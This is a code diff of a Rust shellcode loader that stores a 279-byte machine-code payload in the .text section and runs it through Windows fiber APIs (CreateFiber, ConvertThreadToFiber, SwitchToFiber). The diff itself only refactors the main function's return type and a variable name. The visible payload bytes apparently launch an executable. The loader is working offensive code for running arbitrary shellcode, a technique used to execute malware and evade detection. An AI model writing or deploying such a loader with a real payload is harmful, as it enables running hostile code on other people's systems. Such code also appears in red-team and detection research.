@@ -1,3 +1,4 @@
+use windows::core::Result;
 use windows::Win32::System::Threading::{CreateFiber, SwitchToFiber, ConvertThreadToFiber};
 
 #[link_section = ".text"]
@@ -22,11 +23,13 @@ static SHELLCODE: [u8; 279] = [
     0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00,
 ];
 
-fn main() {
+fn main() -> Result<()> {
     unsafe {
-        let fiber_address = CreateFiber(0, Some(std::mem::transmute(&SHELLCODE)) , None);
+        let address = CreateFiber(0, Some(std::mem::transmute(&SHELLCODE)) , None);
         ConvertThreadToFiber(None);
-        let _ = SwitchToFiber(fiber_address);
+        SwitchToFiber(address);
     }
+
+    Ok(())
 }
 
